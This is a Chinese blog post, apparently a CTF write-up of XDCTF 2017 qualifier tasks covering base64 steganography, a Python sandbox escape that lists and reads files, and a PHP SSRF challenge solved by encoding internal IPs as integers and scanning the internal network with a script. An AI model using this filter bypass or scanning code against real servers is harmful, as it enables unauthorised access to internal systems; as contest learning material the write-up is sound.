@@ -1,0 +1,477 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=&#34;auto&#34;>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/xuexi.png">
+  <link rel="icon" type="image/png" href="/img/xuexi.png">
+  <meta name="viewport"
+        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="description" content="">
+  <meta name="author" content="John Doe">
+  <meta name="keywords" content="">
+  <title>XDCTF 初赛部分题目WriteUp - Hexo</title>
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/css/bootstrap.min.css" />
+
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/github-markdown-css@4.0.0/github-markdown.min.css" />
+  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />
+
+  
+    
+    
+      
+      <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@10.4.0/styles/github-gist.min.css" />
+    
+  
+
+  
+    <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css" />
+  
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+<!-- 自定义样式保持在最底部 -->
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    var CONFIG = {"hostname":"mengsec.com","root":"/","version":"1.8.7","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"copy_btn":true,"image_zoom":{"enable":true},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"onlypost":false},"web_analytics":{"enable":false,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null}}};
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+<meta name="generator" content="Hexo 5.3.0"></head>
+
+
+<body>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand"
+       href="/">&nbsp;<strong>MengChen's Blog</strong>&nbsp;</a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                归档
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                标签
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/links/">
+                <i class="iconfont icon-link-fill"></i>
+                友链
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" data-toggle="modal" data-target="#modalSearch">&nbsp;<i
+                class="iconfont icon-search"></i>&nbsp;</a>
+          </li>
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" href="javascript:">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div class="banner" id="banner" parallax=true
+         style="background: url('/img/default.png') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+          <div class="page-header text-center fade-in-up">
+            <span class="h2" id="subtitle" title="XDCTF 初赛部分题目WriteUp">
+              
+            </span>
+
+            
+              <div class="mt-3">
+  
+  
+    <span class="post-meta">
+      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+      <time datetime="2017-10-04 13:27" pubdate>
+        2017年10月4日 下午
+      </time>
+    </span>
+  
+</div>
+
+<div class="mt-1">
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-chart"></i>
+      858 字
+    </span>
+  
+
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-clock-fill"></i>
+      
+      
+      13
+       分钟
+    </span>
+  
+
+  
+  
+</div>
+
+            
+          </div>
+
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div class="py-5" id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">XDCTF 初赛部分题目WriteUp</h1>
+            
+            <div class="markdown-body">
+              <p>国庆假期水了下XDCTF的初赛，最后拿了个33名，没进决赛，不过学了不少东西，记一下</p>
+<a id="more"></a>
+<h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="0x01-基础为王"><a href="#0x01-基础为王" class="headerlink" title="0x01 基础为王"></a>0x01 基础为王</h3><p>从给的数据包中，可以找到两个分别名为flag-1 flag-2的图片，提取出来以后，使用Stegosolve进行一次XOR操作即可获得flag</p>
+<p><img src="https://image.mengsec.com/XDCTF-Crypto-1.png" srcset="/img/loading.gif"></p>
+<h3 id="0x02-基础之Base64"><a href="#0x02-基础之Base64" class="headerlink" title="0x02 基础之Base64"></a>0x02 基础之Base64</h3><p>给了长长的一大串base64，解密之后是一个C程序脚本，运行出helloword..</p>
+<p>肯定不对啊，谷歌找资料，知道为base64隐写，网上有脚本可以直接进行解密</p>
+<p>脚本如下</p>
+<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs css"># -*- coding: cp936 -*-<br>b64chars = <span class="hljs-string">&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&#x27;</span><br>with <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;data.txt&#x27;</span>, <span class="hljs-string">&#x27;rb&#x27;</span>) as f:<br>	bin_str = <span class="hljs-string">&#x27;&#x27;</span><br>	for line in f.<span class="hljs-built_in">readlines</span>():<br>	    stegb64 = <span class="hljs-string">&#x27;&#x27;</span>.<span class="hljs-built_in">join</span>(line.<span class="hljs-built_in">split</span>())<br>	    rowb64 =  <span class="hljs-string">&#x27;&#x27;</span>.<span class="hljs-built_in">join</span>(stegb64.<span class="hljs-built_in">decode</span>(<span class="hljs-string">&#x27;base64&#x27;</span>).<span class="hljs-built_in">encode</span>(<span class="hljs-string">&#x27;base64&#x27;</span>).<span class="hljs-built_in">split</span>())<br>  		offset = <span class="hljs-built_in">abs</span>(b64chars.<span class="hljs-built_in">index</span>(stegb64.<span class="hljs-built_in">replace</span>(<span class="hljs-string">&#x27;=&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>)[-<span class="hljs-number">1</span>])-b64chars.<span class="hljs-built_in">index</span>(rowb64.<span class="hljs-built_in">replace</span>(<span class="hljs-string">&#x27;=&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>)[-<span class="hljs-number">1</span>]))<br>    	equalnum = stegb64.<span class="hljs-built_in">count</span>(<span class="hljs-string">&#x27;=&#x27;</span>) #no equalnum no offset<br>    	if equalnum:<br>        	bin_str += <span class="hljs-built_in">bin</span>(offset)[<span class="hljs-number">2</span>:].<span class="hljs-built_in">zfill</span>(equalnum * <span class="hljs-number">2</span>)<br>    	print <span class="hljs-string">&#x27;&#x27;</span>.<span class="hljs-built_in">join</span>([<span class="hljs-built_in">chr</span>(<span class="hljs-built_in">int</span>(bin_str[i:i + <span class="hljs-number">8</span>], <span class="hljs-number">2</span>)) for i in <span class="hljs-built_in">xrange</span>(<span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(bin_str), <span class="hljs-number">8</span>)])<br></code></pre></td></tr></table></figure>
+<p>直接运行即可</p>
+<h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><p>Web就做出来一个题，比较菜/(ㄒoㄒ)/~~</p>
+<h3 id="0x01-Web2"><a href="#0x01-Web2" class="headerlink" title="0x01 Web2"></a>0x01 Web2</h3><p>题目忘记截图了。</p>
+<p>python用来执行系统命令的四种方法都行不通，故意引用一个不存在的模块会在错误报告中，找到绝对路径</p>
+<pre><code>File &quot;/codes/6707603a4141a84912289293db7dcc1f/a.py&quot;
+</code></pre>
+<p>而且glob模块并没有被禁用，可以借助它来列目录</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> glob<br><span class="hljs-keyword">for</span> filename <span class="hljs-keyword">in</span> glob.glob(<span class="hljs-string">r&#x27;&#x27;</span>):<br>	<span class="hljs-built_in">print</span> filename<br></code></pre></td></tr></table></figure>
+<p>从绝对路径开始，往下找，flag就在codes目录中，直接open读取输出即可获得flag</p>
+<h3 id="0x02-Web3"><a href="#0x02-Web3" class="headerlink" title="0x02 Web3"></a>0x02 Web3</h3><p>这个题目我没做出来，在此放上大表哥的flag</p>
+<p>flag页面的URL为<code>http://web.ctf.xidian.edu.cn/web3/?file=flag.html</code>，推测为文件读取。</p>
+<p>将flag.html改为index.php获得源码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs php">php<br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">/*//设置open_basedir</span><br><span class="hljs-comment">ini_set(&quot;open_basedir&quot;, &quot;/home/shawn/www/index/&quot;);</span><br><span class="hljs-comment"> */</span><br><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>])) &#123;<br>	<span class="hljs-variable">$file</span> = trim(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>]);<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>	<span class="hljs-variable">$file</span> = <span class="hljs-string">&quot;main.html&quot;</span>;<br>&#125;<br><br><span class="hljs-comment">// disallow ip</span><br><span class="hljs-keyword">if</span> (preg_match(<span class="hljs-string">&#x27;/^(http:\/\/)+([^\/]+)/i&#x27;</span>, <span class="hljs-variable">$file</span>, <span class="hljs-variable">$domain</span>)) &#123;<br>	<span class="hljs-variable">$domain</span> = <span class="hljs-variable">$domain</span>[<span class="hljs-number">2</span>];<br>	<span class="hljs-keyword">if</span> (stripos(<span class="hljs-variable">$domain</span>, <span class="hljs-string">&quot;.&quot;</span>) !== <span class="hljs-literal">false</span>) &#123;<br>		<span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Hacker&quot;</span>);<br>	&#125;<br>&#125;<br><br><span class="hljs-keyword">if</span>( 	@file_get_contents(<span class="hljs-variable">$file</span>)!=<span class="hljs-string">&#x27;&#x27;</span>)&#123;<br><span class="hljs-keyword">echo</span> file_get_contents(<span class="hljs-variable">$file</span>);<br><br>&#125;<span class="hljs-keyword">else</span>&#123;<br></code></pre></td></tr></table></figure>
+
+
+<p>在这里卡了很久，最后推测是ssrf，通过读取<code>/etc/hosts</code>文件得知内网ip为<code>172.18.0.3</code>。</p>
+<p>由于正则表达式过滤了形如<code>127.0.0.1</code>的ip，使用整形ip来代替，扫描内网。</p>
+<figure class="highlight processing"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs processing">#-*- coding:utf<span class="hljs-number">-8</span> -*-<br><span class="hljs-keyword">import</span> socket<br><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> urllib<br><br><span class="hljs-keyword">for</span> i in range(<span class="hljs-number">1</span>, <span class="hljs-number">256</span>):<br>	ip = <span class="hljs-string">&#x27;172.18.0.%d&#x27;</span> % i<br>	int_ip = <span class="hljs-built_in">int</span>(socket.inet_aton(ip).encode(<span class="hljs-string">&#x27;hex&#x27;</span>), <span class="hljs-number">16</span>)<br>	#<span class="hljs-built_in">print</span> int_ip<br>	r = requests.<span class="hljs-built_in">get</span>(<span class="hljs-string">&#x27;http://web.ctf.xidian.edu.cn/web3/?file=&#x27;</span>+urllib.quote_plus(<span class="hljs-string">&#x27;http://%d&#x27;</span> % int_ip))<br>	<span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;flag&#x27;</span> in r.<span class="hljs-built_in">text</span>:<br>		<span class="hljs-built_in">print</span> ip, int_ip<br>		<span class="hljs-built_in">print</span> r.<span class="hljs-built_in">text</span><br>		<span class="hljs-keyword">break</span><br></code></pre></td></tr></table></figure>
+<p>172.18.0.2有flag</p>
+<figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs dust"><span class="xml">172.18.0.2 2886860802</span><br><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span></span><br><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>403 Forbidden<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span></span><br><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">body</span> <span class="hljs-attr">bgcolor</span>=<span class="hljs-string">&quot;white&quot;</span>&gt;</span></span><br><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">center</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>403 Forbidden<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">center</span>&gt;</span></span><br><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">hr</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">center</span>&gt;</span>nginx/1.13.5<span class="hljs-tag">&lt;/<span class="hljs-name">center</span>&gt;</span></span><br><span class="xml"><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span></span><br><span class="xml"><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span></span><br><span class="xml"><span class="hljs-comment">&lt;!-- a padding to disable MSIE and Chrome friendly error page --&gt;</span></span><br><span class="xml"><span class="hljs-comment">&lt;!-- a padding to disable MSIE and Chrome friendly error page --&gt;</span></span><br><span class="xml"><span class="hljs-comment">&lt;!-- a padding to disable MSIE and Chrome friendly error page --&gt;</span></span><br><span class="xml"><span class="hljs-comment">&lt;!-- a padding to disable MSIE and Chrome friendly error page --&gt;</span></span><br><span class="xml"><span class="hljs-comment">&lt;!-- a padding to disable MSIE and Chrome friendly error page --&gt;</span></span><br><span class="xml"><span class="hljs-comment">&lt;!-- do u see me? ha flag</span></span><span class="hljs-template-variable">&#123;0e34c0321b2b3048d399b41a8ffda584&#125;</span><span class="xml"><span class="hljs-comment"> --&gt;</span></span><br></code></pre></td></tr></table></figure>
+<h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="0x01-邮箱"><a href="#0x01-邮箱" class="headerlink" title="0x01 邮箱"></a>0x01 邮箱</h3><p>根据提示</p>
+<p>小黑发现一个有趣的博客，于是注册了一个账号，你能找到他的邮箱地址吗？<br>注意：直接递交邮箱地址即可。</p>
+<p>打开数据包后，查找含有 register 的数据流</p>
+<pre><code>http contains &quot;register&quot;
+</code></pre>
+<p><img src="https://image.mengsec.com/XDCTF-Misc-%E9%82%AE%E7%AE%B1-1.png" srcset="/img/loading.gif"></p>
+<p>分别进行追踪流操作，经过尝试可以获得flag</p>
+<p><img src="https://image.mengsec.com/XDCTF-Misc-%E9%82%AE%E7%AE%B1-2.png" srcset="/img/loading.gif"></p>
+
+            </div>
+            <hr>
+            <div>
+              <div class="post-metas mb-3">
+                
+                
+                  <div class="post-meta">
+                    <i class="iconfont icon-tags"></i>
+                    
+                      <a class="hover-with-bg" href="/tags/CTF/">CTF</a>
+                    
+                      <a class="hover-with-bg" href="/tags/Writeup/">Writeup</a>
+                    
+                      <a class="hover-with-bg" href="/tags/XDCTF/">XDCTF</a>
+                    
+                  </div>
+                
+              </div>
+              
+                <p class="note note-warning">本博客所有文章除特别声明外，均采用 <a target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" rel="nofollow noopener noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！</p>
+              
+              
+                <div class="post-prevnext">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2017/10/10/Bugku%E9%83%A8%E5%88%86%E9%A2%98%E7%9B%AEWriteup/">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">Bugku部分题目Writeup</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2017/09/18/2017-%E9%97%AE%E9%BC%8E%E6%9D%AF%E9%A2%84%E8%B5%9B-%E9%83%A8%E5%88%86%E9%A2%98%E7%9B%AEWriteup/">
+                        <span class="hidden-mobile">2017-问鼎杯预赛-部分题目Writeup</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+      </div>
+    
+  </div>
+</div>
+
+<!-- Custom -->
+
+
+    
+
+    
+      <a id="scroll-top-button" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v"
+                 for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+
+    
+  </main>
+
+  <footer class="text-center mt-5 py-3">
+  <div class="footer-content">
+     <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+  </div>
+  
+
+  
+
+  
+</footer>
+
+<!-- SCRIPTS -->
+
+  <script  src="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://cdn.jsdelivr.net/npm/jquery@3.5.1/dist/jquery.min.js" ></script>
+<script  src="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/js/bootstrap.min.js" ></script>
+<script  src="/js/debouncer.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+<!-- Plugins -->
+
+
+  
+    <script  src="/js/lazyload.js" ></script>
+  
+
+
+
+  
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/tocbot@4.12.0/dist/tocbot.min.js" ></script>
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js" ></script>
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/anchor-js@4.3.0/anchor.min.js" ></script>
+
+
+
+  <script defer src="https://cdn.jsdelivr.net/npm/clipboard@2.0.6/dist/clipboard.min.js" ></script>
+
+
+
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/typed.js@2.0.11/lib/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var title = document.getElementById('subtitle').title;
+      
+      typing(title)
+      
+    })(window, document);
+  </script>
+
+
+
+  <script  src="/js/local-search.js" ></script>
+  <script>
+    (function () {
+      var path = "/local-search.xml";
+      var inputArea = document.querySelector("#local-search-input");
+      inputArea.onclick = function () {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+        this.onclick = null
+      }
+    })()
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<!-- 主题的启动项 保持在最底部 -->
+<script  src="/js/boot.js" ></script>
+
+
+
+</body>
+</html>
